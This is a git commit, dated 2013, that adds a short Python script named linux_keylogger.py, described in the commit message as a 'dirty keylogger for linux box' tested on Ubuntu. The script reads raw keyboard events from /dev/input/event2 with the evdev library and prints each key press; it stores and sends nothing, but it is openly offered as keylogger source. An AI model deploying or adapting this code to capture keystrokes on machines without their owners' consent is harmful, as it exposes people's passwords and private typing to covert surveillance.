16d67a3bcc2a769ef4f305199cc7288e6e2551f1
shanghai052 <shanghai052@gmail.com>
2013-12-29 15:05:49 -0600

    dirty keylogger for linux box
    tested on ubuntu

---
+++ linux_keylogger.py
@@ -0,0 +1,10 @@
+from evdev import InputDevice, categorize, ecodes
+from select import select
+
+dev = InputDevice('/dev/input/event2')
+
+while True:
+    r,w,x = select([dev], [], [])
+    for event in dev.read():
+        if event.type == ecodes.EV_KEY:
+            print categorize(event)
